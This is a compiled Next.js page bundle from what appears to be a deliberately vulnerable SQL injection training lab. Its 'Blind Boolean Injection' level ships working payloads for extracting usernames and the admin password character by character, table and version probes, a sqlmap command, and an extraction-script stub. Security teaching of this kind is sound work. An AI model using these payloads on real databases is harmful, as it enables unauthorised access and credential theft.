(()=>{var e={};e.id=11,e.ids=[11],e.modules={2934:e=>{"use strict";e.exports=require("next/dist/client/components/action-async-storage.external.js")},4580:e=>{"use strict";e.exports=require("next/dist/client/components/request-async-storage.external.js")},5869:e=>{"use strict";e.exports=require("next/dist/client/components/static-generation-async-storage.external.js")},399:e=>{"use strict";e.exports=require("next/dist/compiled/next-server/app-page.runtime.prod.js")},7528:(e,s,t)=>{"use strict";t.r(s),t.d(s,{GlobalError:()=>i.a,__next_app__:()=>m,originalPathname:()=>u,pages:()=>d,routeModule:()=>p,tree:()=>c}),t(9297),t(2029),t(5866);var r=t(3191),a=t(8716),n=t(7922),i=t.n(n),l=t(5231),o={};for(let e in l)0>["default","tree","pages","GlobalError","originalPathname","__next_app__","routeModule"].indexOf(e)&&(o[e]=()=>l[e]);t.d(s,o);let c=["",{children:["level4",{children:["__PAGE__",{},{page:[()=>Promise.resolve().then(t.bind(t,9297)),"c:\\Users\\YASSER\\Documents\\GitHub\\Lab-Security\\src\\app\\level4\\page.tsx"]}]},{}]},{layout:[()=>Promise.resolve().then(t.bind(t,2029)),"c:\\Users\\YASSER\\Documents\\GitHub\\Lab-Security\\src\\app\\layout.tsx"],"not-found":[()=>Promise.resolve().then(t.t.bind(t,5866,23)),"next/dist/client/components/not-found-error"]}],d=["c:\\Users\\YASSER\\Documents\\GitHub\\Lab-Security\\src\\app\\level4\\page.tsx"],u="/level4/page",m={require:t,loadChunk:()=>Promise.resolve()},p=new r.AppPageRouteModule({definition:{kind:a.x.APP_PAGE,page:"/level4/page",pathname:"/level4",bundlePath:"",filename:"",appPaths:[]},userland:{loaderTree:c}})},4278:(e,s,t)=>{Promise.resolve().then(t.bind(t,6139))},6139:(e,s,t)=>{"use strict";t.r(s),t.d(s,{default:()=>n});var r=t(326),a=t(8530);function n(){let e=async e=>{try{let s=await fetch("/api/level4",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});return await s.json()}catch(e){return{success:!1,error:"Failed to connect to server"}}};return r.jsx("div",{className:"min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12",children:(0,r.jsxs)("div",{className:"container mx-auto px-6",children:[r.jsx(a.Z,{level:4,title:"Blind Boolean Injection",description:"This level simulates a blind SQL injection scenario where you can only infer information based on the application's true/false responses. No direct database output is shown, making data extraction more challenging.",onSubmit:e,hints:["This level doesn't show database errors or results directly","Look for differences in application behavior (true/false responses)","Try: ' AND (SELECT COUNT(*) FROM users) > 0--","Use substring functions to extract data character by character","Example: ' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'--"],isVulnerable:!0}),r.jsx("div",{className:"mt-12 max-w-4xl mx-auto",children:(0,r.jsxs)("div",{className:"vulnerability-card rounded-lg p-8",children:[r.jsx("h2",{className:"text-2xl font-semibold mb-6 text-cyber-blue",children:"\uD83D\uDD0D Technical Details"}),(0,r.jsxs)("div",{className:"space-y-6",children:[(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Blind Injection Techniques:"}),r.jsx("div",{className:"code-block",children:`-- Test if injection point exists
' AND 1=1--        (should return normal response)
' AND 1=2--        (should return different response)

-- Enumerate database structure
' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT COUNT(*) FROM users) > 5--
' AND (SELECT COUNT(*) FROM users) > 10--

-- Extract data character by character
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'b'--
' AND (SELECT SUBSTRING(username,2,1) FROM users LIMIT 1) = 'a'--`})]}),(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Response Analysis:"}),(0,r.jsxs)("ul",{className:"space-y-2 text-gray-300",children:[(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),'True condition: "Login failed" or normal response']}),(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),"False condition: Different error or response pattern"]}),(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),"Response time differences may also indicate true/false"]}),(0,r.jsxs)("li",{className:"flex items-start",children:[r.jsx("span",{className:"text-cyber-blue mr-2",children:"•"}),"HTTP status codes might change based on query result"]})]})]}),(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Advanced Boolean Techniques:"}),r.jsx("div",{className:"code-block",children:`-- Binary search for efficiency
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 64--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 96--

-- Check table existence
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='admin_users') > 0--

-- Version detection
' AND (SELECT SUBSTRING(version(),1,8)) = 'PostgreS'--`})]}),(0,r.jsxs)("div",{children:[r.jsx("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Automation Tools:"}),r.jsx("div",{className:"code-block",children:`# SQLMap for automated blind injection
sqlmap -u "http://target/api/level4" --data="username=test&password=test" --method=POST --technique=B

# Custom Python script for boolean-based extraction
import requests
import string

def extract_data(position, table, column):
    for char in string.printable:
        payload = f"' AND (SELECT SUBSTRING({column},{position},1) FROM {table} LIMIT 1) = '{char}'--"
        # Send request and analyze response
        
# Burp Suite Intruder for character-by-character extraction`})]})]})]})})]})})}},9297:(e,s,t)=>{"use strict";t.r(s),t.d(s,{default:()=>r});let r=(0,t(8570).createProxy)(String.raw`c:\Users\YASSER\Documents\GitHub\Lab-Security\src\app\level4\page.tsx#default`)}};var s=require("../../webpack-runtime.js");s.C(e);var t=e=>s(s.s=e),r=s.X(0,[276,471,802],()=>t(7528));module.exports=r})();